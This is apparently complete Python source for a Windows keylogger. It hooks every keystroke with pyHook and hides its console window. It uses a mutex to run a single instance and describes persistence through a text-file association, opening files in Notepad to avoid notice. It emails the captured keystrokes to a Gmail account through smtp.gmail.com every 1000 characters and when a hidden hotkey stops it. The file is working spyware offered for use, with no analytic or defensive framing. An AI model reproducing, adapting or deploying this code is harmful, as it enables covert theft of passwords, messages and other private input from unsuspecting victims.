import smtplib, time, os, threading, sys
import win32console, win32gui, win32event, win32api, winerror
from win32con import VK_CAPITAL
try:
    import pythoncom, pyHook
    from pyHook import GetKeyState, HookConstants
except ImportError:
    print("required pyhook and py2win32")
    exit()

strEmailAc = "email@gmail.com"
strEmailPass = "pass"
blnBackRemove = "True"  # set this to True if you prefer the program removes the last key if the user types backspace

blnStop = "False"

mutex = win32event.CreateMutex(None, 1, 'mutex_xp4key') # exit if there are multiple instances
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit()

def hide(): # hide cmd window (optional if compiling as .exe)
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True
hide()

# if persistence is installed opening any text file
# will open the keylogger then use this code below
# to open the txt file in notepad
if len(sys.argv) == 2:
    strtxtFileCommand = os.environ["windir"]+"\\notepad.exe "+sys.argv[1]
    os.system(strtxtFileCommand)

def OnKeyboardEvent(event):
    global strLogs
    try: # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""

    def SendMessages(strLogs, strEmailAc, strEmailPass, blnStop):
        try:
            if blnStop == "True":
                strDateTime = "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            else:
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
            strMessage = strDateTime + "\n\n" + strLogs
            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs", strMessage)

            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            SmtpServer.ehlo()   # identifies you to the smtp server
            SmtpServer.login(strEmailAc, strEmailPass)
            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
        except:
            # if for some reason, the email cannot send, exit program including threads.
            os._exit(1)

    if GetKeyState(HookConstants.VKeyToID("VK_CONTROL")) and GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) and HookConstants.IDToName(event.KeyID) == "H":
        # CTRL-RIGHT_SHIFT-H to stop the program
        # create a new thread so that there is no delay while sending email
        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, "True"))
        SendMailThread.start()
        exit()

    if event.Key == "Return": # if the user types "enter" move to a new line
        strLogs = strLogs + "\n"
    elif event.Key == "Space":
        strLogs = strLogs + " "
    elif event.Key == "Back":
        if blnBackRemove == "True": # if the file is configured to delete the last key if backspaced is pressed
            if not strLogs == "":
                strLogs = strLogs[0:len(strLogs) - 1]
        else:
            strLogs = strLogs + " [Back] "
    elif event.Key == "Delete":
        strLogs = strLogs + " [Delete] "
    elif event.Key == "Tab":
        strLogs = strLogs + "\t"
    elif event.Key == "Oem_5": # if backslash is pressed
        strLogs = strLogs + "\\"
    # check to see if key is shift + backslash
    elif event.Key == "Oem_5" and (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))):
        strLogs = strLogs + "|"
    elif event.Key == "Capital" or event.Key == "Rshift" or event.Key == "Lshift":
        pass
    elif len(event.Key) > 1: # check to see if key is a special key
        strLogs = strLogs + " [" + event.Key + "] "
    else:
        # check to see if caps lock is on or the shift key is held down
        if win32api.GetKeyState(VK_CAPITAL) == 1 or (GetKeyState(HookConstants.VKeyToID("VK_RSHIFT")) or GetKeyState(HookConstants.VKeyToID("VK_LSHIFT"))) and HookConstants.IDToName(event.KeyID).isalpha():
            strLogs = strLogs + event.Key
        else:
            # since event.Key outputs all keys as uppercase, lower normal ones
            strLogs = strLogs + ((event.Key).lower())

    # set amount of characters until log will be sent out. Currently 1000 characters, roughly 160-200 words
    if len(strLogs) >= 1000:
        # create a new thread so that there is no delay while sending email
        SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass, blnStop))
        SendMailThread.start()
        strLogs = ""
    print(strLogs)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
